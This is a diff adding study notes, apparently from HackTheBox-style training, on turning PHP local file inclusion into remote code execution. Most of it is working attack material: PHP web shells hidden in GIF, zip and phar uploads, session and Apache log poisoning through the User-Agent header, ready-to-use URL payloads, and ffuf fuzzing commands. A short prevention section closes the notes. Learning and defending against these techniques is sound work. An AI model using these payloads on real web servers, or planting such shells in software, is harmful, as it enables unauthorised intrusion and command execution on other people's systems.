@@ -118,3 +118,179 @@ Dangerous PHP Functions that can be abused for RCE
 print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
 ?>
 ```
+### File Upload
+If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
+
+
+![image](https://user-images.githubusercontent.com/99975622/213590985-ec941f58-ecb9-4732-aa34-96fe7af7ee57.png)
+
+File inclusion is usually done through image uplaod forms.
+
+We can create a malicious image file;
+
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+For file identity we can add the gif file tag/magic bytes at the start of the file...
+```
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
+
+___Note:__ We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.
+
+After uploading our malicious file...
+```
+http://example.com/index.php?language=./profile_images/shell.gif&cmd=id
+```
+__Note:__ To include to our uploaded file, we used ./profile_images/ as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to ../ out of that directory and then use our URL path, as we learned in previous sections
+
+### Zip Upload
+This technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.
+
+We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.
+
+To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:
+```
+MetricCode@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+__Note:__ Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
+
+
+After uploading...
+```
+http://example.com/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+### Phar Upload
+Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
+
+```
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:
+```
+MetricCode@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id)
+
+```
+http://example.com/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+### Log Poisoning
+We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.
+
+![image](https://user-images.githubusercontent.com/99975622/213595445-65074421-ba16-4f96-ae14-b97f6891f84a.png)
+
+### PHP Session Poisoning
+Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
+
+We can see that the session file contains two values: page, which shows the selected language page, and preference, which shows the selected language. The preference value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the page value is under our control, as we can control it through the ?language= parameter.
+
+
+If the sessions is changable, we can do a session poisoning...
+```
+http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
+```
+If the language status changed;
+```
+http://example.com/index.php?language=<?php system($_GET["cmd"]);?>
+
+Url encoding...
+http://example.com/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+with that, we can get rce...
+```
+http://example.com/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
+This is because the injection is temporary...
+
+### Server Log Poisoning
+Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.
+
+Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.
+
+By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.
+
+We can do this on burp or via curl...
+```
+MetricCode@htb[/htb]$ curl -s "http://example.com/index.php" -A '<?php system($_GET["cmd"]); ?>'
+```
+
+As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (?cmd=id):
+
+```
+http://example.com/index.php?language=/var/log/apache2/access.log&cmd=id
+
+```
+__Tip:__ The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.
+
+Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
+- /var/log/sshd.log
+- /var/log/mail
+- /var/log/vsftpd.log
+
+### Fuzzing for parameters
+```
+MetricCode@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+```
+We can use this parameters from this list...
+```
+https://twitter.com/trbughunters/status/1279768631845494787
+```
+Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests.
+
+We can also fuzz for LFI in different encodings...
+```
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+```
+##### ffuf 
+```
+MetricCode@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+```
+
+### Patching...
+#### File Inclusion Prevention...
+The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs
+
+. Whenever any of the functions is used, we should ensure that no user input is directly going into them.
+
+#### Preventing Directory Traversal
+The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename.
+PHP has __basename()__, which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. 
+The downside to this method is that if the application needs to enter any directories, it will not be able to do it.
+
+#### __sanitizing user input...__
+```
+while(substr_count($input, '../', 0)) {
+    $input = str_replace('../', '', $input);
+};
+```
+#### Web Server Configurations...
+Turning allow_url_fopen and allow_url_include to Off.
+Mod_user and Expect modules should be disabled.
+Locking the web_root directory to www...
+```
+In PHP that can be done by adding open_basedir = /var/www in the php.ini file
+```
+
+#### WAF(Web Application Firewall)
+Eg. Web Security...
+ When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. 
+ 
+ To disable specific php functions...
+ ```
+ https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/
+ ```
